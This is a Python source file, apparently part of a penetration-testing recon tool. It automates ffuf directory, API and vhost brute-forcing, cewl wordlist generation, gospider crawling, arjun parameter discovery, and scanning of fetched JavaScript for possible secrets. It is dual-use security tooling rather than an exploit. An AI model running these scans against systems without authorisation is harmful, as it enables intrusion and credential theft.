def _ffuf_extensions(fp: dict) -> list[str]:
    """Return appropriate ffuf -e extension args based on detected framework."""
    server = fp.get("server", "").lower()
    powered_by = fp.get("powered_by", "").lower()
    if fp.get("is_nextjs"):
        return ["-e", ".json"]
    if fp.get("is_php") or "php" in powered_by:
        return ["-e", ".php,.html,.txt,.xml,.json,.bak"]
    if "iis" in server or "asp" in powered_by:
        return ["-e", ".asp,.aspx,.html,.txt,.xml,.config"]
    if "node" in server or "node" in powered_by or "express" in powered_by:
        return ["-e", ".json"]
    return ["-e", ".php,.html,.txt,.xml,.json"]


def _dir_bust(base_url: str, runner: Runner, findings: Findings, fp: dict):
    wl = _WORDLIST_DIRS if _exists(_WORDLIST_DIRS) else (
        _WORDLIST_DIRS_SMALL if _exists(_WORDLIST_DIRS_SMALL) else None
    )
    if not wl:
        findings.note("No dir-bust wordlist found — skipping")
        return

    findings.h4("Directory Bust")
    cmd = [
        "ffuf", "-u", f"{base_url}/FUZZ",
        "-w", wl,
        "-fc", "404",
        "-t", str(_FFUF_THREADS),
        "-timeout", _REQ_TIMEOUT,
        "-ic",
        "-noninteractive",
    ]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{_label(base_url)}_ffuf_dirs", timeout=int(_FFUF_TIMEOUT))
    hits = _print_ffuf(out, findings)
    # Fetch response body for 500 paths with non-trivial content — often reveals framework/CVE
    for path, status, size in hits:
        if status == "500" and int(size) > 150:
            br = subprocess.run(
                ["curl", "-sk", "--max-time", "10", f"{base_url}/{path}"],
                capture_output=True, text=True,
            )
            body = br.stdout.strip()
            if body:
                findings.note(f"`/{path}` response body (500):")
                findings.code_block(body[:800])


# ── cewl custom wordlist generation ──────────────────────────────────────────

def _run_cewl(base_url: str, runner: Runner, findings: Findings) -> str | None:
    """
    Generate a site-specific wordlist by harvesting words from the target.
    Returns the path to the wordlist file, or None if cewl produced nothing.
    """
    wl_path = runner.ws.loot_dir / f"cewl_{_label(base_url)}.txt"
    cmd = ["cewl", base_url, "-d", "2", "-m", "5", "-w", str(wl_path),
           "--lowercase", "--with-numbers"]
    findings.cmd(" ".join(cmd))
    runner.run(cmd, f"web_{_label(base_url)}_cewl", timeout=120)

    if wl_path.exists() and wl_path.stat().st_size > 0:
        line_count = len(wl_path.read_text().splitlines())
        findings.bullet(f"cewl generated {line_count} custom words → `{wl_path}`")
        return str(wl_path)
    return None


def _dir_bust_cewl(base_url: str, wordlist: str, runner: Runner, findings: Findings, fp: dict):
    """Second dir bust pass using the cewl-generated wordlist (deep mode only)."""
    findings.h4("Directory Bust (cewl wordlist)")
    cmd = [
        "ffuf", "-u", f"{base_url}/FUZZ",
        "-w", wordlist,
        "-fc", "404",
        "-t", str(_FFUF_THREADS),
        "-timeout", _REQ_TIMEOUT,
        "-ic",
        "-noninteractive",
    ] + _ffuf_extensions(fp)
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{_label(base_url)}_ffuf_cewl", timeout=int(_FFUF_TIMEOUT))
    _print_ffuf(out, findings)


# ── API endpoint discovery ────────────────────────────────────────────────────

def _api_bust(base_url: str, runner: Runner, findings: Findings):
    wl = _WORDLIST_API if _exists(_WORDLIST_API) else _WORDLIST_DIRS
    api_prefixes = ["/api", "/v1", "/v2", "/api/v1", "/api/v2", "/rest", "/graphql"]

    active_prefixes: list[str] = []
    for prefix in api_prefixes:
        result = subprocess.run(
            ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
             "-w", "%{http_code}", f"{base_url}{prefix}"],
            capture_output=True, text=True,
        )
        if result.stdout.strip() not in ("404", "000", ""):
            active_prefixes.append(prefix)

    if not active_prefixes:
        return

    findings.h4("API Endpoints")
    for prefix in active_prefixes:
        cmd = [
            "ffuf", "-u", f"{base_url}{prefix}/FUZZ",
            "-w", wl,
            "-fc", "404",
            "-t", str(_FFUF_THREADS),
            "-timeout", _REQ_TIMEOUT,
            "-ic",
            "-noninteractive",
        ]
        findings.cmd(" ".join(cmd))
        out = runner.run(
            cmd,
            f"web_{_label(base_url)}_api{prefix.replace('/', '_')}",
            timeout=300,
        )
        results = _FFUF_RE.findall(out)
        if results:
            findings.bullet(f"**`{prefix}`** — {len(results)} endpoint(s):")
            for path, status, size in results:
                findings.bullet(f"  `{prefix}/{path}` — {status} ({size}b)")


# ── Vhost bust ────────────────────────────────────────────────────────────────

def _vhost_bust(ip: str, port: int, scheme: str, domain: str,
                runner: Runner, findings: Findings) -> list[str]:
    if not _exists(_WORDLIST_VHOST):
        findings.note(f"Wordlist missing: `{_WORDLIST_VHOST}` — skipping vhost bust")
        return []

    baseline = _vhost_baseline(ip, port, scheme)
    url = _build_url(scheme, ip, port)

    findings.h4("Vhost Bust")
    cmd = [
        "ffuf", "-u", url,
        "-H", f"Host: FUZZ.{domain}",
        "-w", _WORDLIST_VHOST,
        "-fc", "404",
        "-t", str(_FFUF_THREADS),
        "-timeout", _REQ_TIMEOUT,
        "-ic",
        "-noninteractive",
    ]
    if baseline > 0:
        cmd += ["-fs", str(baseline)]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{_label(url)}_ffuf_vhosts", timeout=300)

    found: list[str] = []
    for match in _FFUF_RE.finditer(out):
        sub, status, size = match.group(1), match.group(2), match.group(3)
        full = f"{sub}.{domain}"
        findings.bullet(f"**`{full}`** — {status} ({size}b)")
        found.append(full)

    return found


def _vhost_baseline(ip: str, port: int, scheme: str) -> int:
    url = _build_url(scheme, ip, port)
    result = subprocess.run(
        ["curl", "-sk", "--max-time", "10",
         "-o", "/dev/null", "-w", "%{size_download}",
         "-H", "Host: p0rtix-baseline-probe.invalid", url],
        capture_output=True, text=True,
    )
    try:
        return int(result.stdout.strip())
    except ValueError:
        return 0


# ── Crawl ─────────────────────────────────────────────────────────────────────

def _crawl(base_url: str, scope: Scope, runner: Runner, findings: Findings):
    findings.h4("Crawl")
    cmd = ["gospider", "-s", base_url, "-c", "5", "-d", "2",
           "--include-subs", "--no-redirect", "-q"]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{_label(base_url)}_gospider", timeout=120)

    in_scope, out_of_scope = _parse_gospider(out, scope)

    js_urls = [u for u in in_scope if u.lower().endswith(".js")]
    if js_urls:
        _scrape_js(js_urls, runner, findings)

    if in_scope:
        findings.bullet(f"**In-scope URLs:** {len(in_scope)}")
        for url in sorted(set(in_scope))[:30]:
            findings.bullet(f"  {url}")
        if len(in_scope) > 30:
            findings.bullet(f"  … and {len(in_scope) - 30} more (see raw output)")

    if out_of_scope:
        findings.h4("External Links (not scanned)")
        for url in sorted(set(out_of_scope))[:20]:
            findings.bullet(url)


def _parse_gospider(output: str, scope: Scope) -> tuple[list[str], list[str]]:
    url_re = re.compile(
        r"\[(?:url|javascript|form|linkfinder|robots|sitemap)\]\s+-\s+\[.*?\]\s+-\s+\[(.+?)\]"
    )
    raw_urls = [m.group(1).strip() for m in url_re.finditer(output)]
    for line in output.splitlines():
        line = line.strip()
        if line.startswith("http") and line not in raw_urls:
            raw_urls.append(line)
    return scope.filter_urls(raw_urls)


# ── JS file analysis ─────────────────────────────────────────────────────────

def _scrape_js(js_urls: list[str], runner: Runner, findings: Findings):
    if not js_urls:
        return
    findings.h4("JS File Analysis")
    any_finding = False
    for url in js_urls[:20]:
        result = subprocess.run(
            ["curl", "-sk", "--max-time", "10", url],
            capture_output=True, text=True,
        )
        content = result.stdout
        if not content.strip():
            continue
        matches = _JS_SECRET_RE.findall(content)
        endpoints = list(dict.fromkeys(
            m for m in re.findall(r'["\'](/[a-zA-Z0-9/_-]{3,60})["\']', content)
            if len(m) > 3
        ))
        if matches:
            any_finding = True
            findings.bullet(f"**`{url}`** — possible secrets:")
            for val in matches[:5]:
                findings.bullet(f"  ⚠ `{val[:60]}`")
                findings.add_summary(f"⚠ Possible secret in JS `{url.split('/')[-1]}`: `{val[:40]}...`")
        if endpoints:
            any_finding = True
            findings.bullet(f"**`{url}`** — endpoints: {', '.join(f'`{e}`' for e in endpoints[:8])}")


# ── Parameter discovery ───────────────────────────────────────────────────────

def _param_fuzz(base_url: str, runner: Runner, findings: Findings):
    findings.h4("Parameter Discovery (arjun)")
    cmd = ["arjun", "-u", base_url, "--stable", "-oT", "/dev/stdout"]
    findings.cmd(" ".join(cmd))
    out = runner.run(cmd, f"web_{_label(base_url)}_arjun", timeout=300)
    params = re.findall(r"\[([+!])\]\s+(\w+)", out)
    found = [p for flag, p in params if flag == "+"]
    if found:
        findings.bullet(f"**Parameters:** {', '.join(f'`{p}`' for p in found)}")
        findings.add_summary(f"Arjun found parameters on {base_url}: {', '.join(found)}")
    elif out.strip() and "[" in out:
        findings.code_block(_trim(out))


# ── Helpers ───────────────────────────────────────────────────────────────────

def _print_ffuf(output: str, findings: Findings) -> list[tuple[str, str, str]]:
    if "[TIMEOUT after" in output:
        findings.note("ffuf timed out before completion — partial results only")
    cleaned = _ANSI_RE.sub("", output)
    results = _FFUF_RE.findall(cleaned)
    for path, status, size in results:
        findings.bullet(f"`/{path}` — {status} ({size}b)")
    if not results:
        findings.note("No results")
    return results


def _build_url(scheme: str, hostname: str, port: int) -> str:
    if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
        return f"{scheme}://{hostname}"
    return f"{scheme}://{hostname}:{port}"


def _label(url: str) -> str:
    return re.sub(r"[^a-z0-9]", "_", url.lower()).strip("_")[:40]


def _exists(path: str) -> bool:
    return Path(path).exists()
